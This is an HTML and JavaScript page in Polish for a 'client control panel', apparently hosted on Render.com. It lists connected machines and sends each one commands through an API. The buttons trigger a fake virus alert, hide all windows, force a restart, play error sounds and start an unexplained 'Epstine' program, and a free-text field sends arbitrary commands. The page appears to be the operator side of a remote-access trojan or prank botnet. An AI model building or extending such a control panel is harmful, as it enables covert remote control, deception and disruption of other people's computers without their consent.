<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Kontrolny Klientów</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 1px solid #eee;
        }
        
        .main-content {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin: 20px 0;
        }
        
        .section {
            flex: 1;
            min-width: 300px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
        }
        
        .client-list {
            max-height: 300px;
            overflow-y: auto;
            margin: 10px 0;
        }
        
        .client-item {
            background: white;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            cursor: pointer;
            border: 2px solid transparent;
        }
        
        .client-item.selected {
            border-color: #2196f3;
            background: #e3f2fd;
        }
        
        .status-active {
            color: green;
            font-weight: bold;
        }
        
        .status-inactive {
            color: red;
            font-weight: bold;
        }
        
        .command-btn {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            background: #4a6fa5;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .command-btn:hover {
            background: #2c3e50;
        }
        
        .danger {
            background: #e74c3c;
        }
        
        .warning {
            background: #f39c12;
        }
        
        .custom-command {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .custom-command input {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        
        footer {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Panel Kontrolny Klientów</h1>
            <div class="status">Serwer Online</div>
        </header>
        
        <div class="main-content">
            <div class="section">
                <h2>Podłączeni Klienci</h2>
                <div id="clientList" class="client-list">
                    <div class="no-clients">Ładowanie klientów...</div>
                </div>
            </div>
            
            <div class="section">
                <h2>Dostępne Komendy</h2>
                <p id="selectedClientInfo">Nie wybrano klienta</p>
                
                <div id="commandButtons">
                    <button class="command-btn" data-cmd="start">Start Programu</button>
                    <button class="command-btn" data-cmd="stop">Stop Programu</button>
                    <button class="command-btn warning" data-cmd="epstine">Epstine Start</button>
                    <button class="command-btn warning" data-cmd="stopepstine">Epstine Stop</button>
                    <button class="command-btn" data-cmd="hideallwindows">Ukryj wszystkie okna</button>
                    <button class="command-btn danger" data-cmd="fake virus alert">Fałszywy alert wirusa</button>
                    <button class="command-btn" data-cmd="restart">Restart komputera</button>
                    <button class="command-btn" data-cmd="error sound">Dźwięk błędu</button>
                    <button class="command-btn" data-cmd="powiadomienie test">Testowe powiadomienie</button>
                </div>
                
                <div class="custom-command">
                    <input type="text" id="customCommand" placeholder="Wpisz własną komendę">
                    <button class="command-btn" onclick="sendCustomCommand()">Wyślij</button>
                </div>
            </div>
        </div>
        
        <footer>
            <p>Panel kontrolny v1.0 | Hosting: Render.com</p>
        </footer>
    </div>

    <script>
        let selectedClient = null;
        let clients = [];
        
        // Ładowanie klientów
        async function loadClients() {
            try {
                const response = await fetch('/api/clients');
                if (!response.ok) throw new Error('Błąd sieci');
                
                clients = await response.json();
                renderClients();
            } catch (error) {
                console.error('Błąd ładowania klientów:', error);
                document.getElementById('clientList').innerHTML = 
                    '<div class="no-clients">Brak połączenia z serwerem</div>';
            }
        }
        
        // Renderowanie listy klientów
        function renderClients() {
            const clientList = document.getElementById('clientList');
            
            if (clients.length === 0) {
                clientList.innerHTML = '<div class="no-clients">Brak aktywnych klientów</div>';
                return;
            }
            
            clientList.innerHTML = clients.map(client => `
                <div class="client-item ${selectedClient?.id === client.id ? 'selected' : ''}" 
                     onclick="selectClient('${client.id}')">
                    <strong>${client.name || 'Klient'}</strong><br>
                    <small>ID: ${client.id.substring(0, 8)}...</small><br>
                    <span class="${client.status === 'active' ? 'status-active' : 'status-inactive'}">
                        ${client.status === 'active' ? 'Online' : 'Offline'}
                    </span>
                </div>
            `).join('');
        }
        
        // Wybór klienta
        function selectClient(clientId) {
            selectedClient = clients.find(c => c.id === clientId);
            document.getElementById('selectedClientInfo').innerHTML = 
                `<strong>Wybrany klient:</strong> ${selectedClient.name || 'Klient'} (${selectedClient.id.substring(0, 8)}...)`;
            renderClients();
        }
        
        // Wysyłanie komendy
        async function sendCommand(command) {
            if (!selectedClient) {
                alert('Proszę wybrać klienta z listy!');
                return;
            }
            
            try {
                const response = await fetch('/api/send_command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        client_id: selectedClient.id,
                        command: command
                    })
                });
                
                const data = await response.json();
                if (data.success) {
                    alert(`Komenda "${command}" wysłana!`);
                } else {
                    alert('Błąd wysyłania komendy!');
                }
            } catch (error) {
                console.error('Błąd:', error);
                alert('Błąd połączenia z serwerem!');
            }
        }
        
        // Wysyłanie własnej komendy
        function sendCustomCommand() {
            const customCmd = document.getElementById('customCommand').value.trim();
            if (customCmd) {
                sendCommand(customCmd);
                document.getElementById('customCommand').value = '';
            }
        }
        
        // Inicjalizacja
        document.addEventListener('DOMContentLoaded', function() {
            // Ładowanie klientów przy starcie
            loadClients();
            
            // Odświeżanie co 3 sekundy
            setInterval(loadClients, 3000);
            
            // Obsługa przycisków komend
            document.querySelectorAll('.command-btn[data-cmd]').forEach(button => {
                button.addEventListener('click', function() {
                    if (this.dataset.cmd) {
                        sendCommand(this.dataset.cmd);
                    }
                });
            });
            
            // Obsługa Enter w polu własnej komendy
            document.getElementById('customCommand').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendCustomCommand();
                }
            });
        });
    </script>
</body>
</html>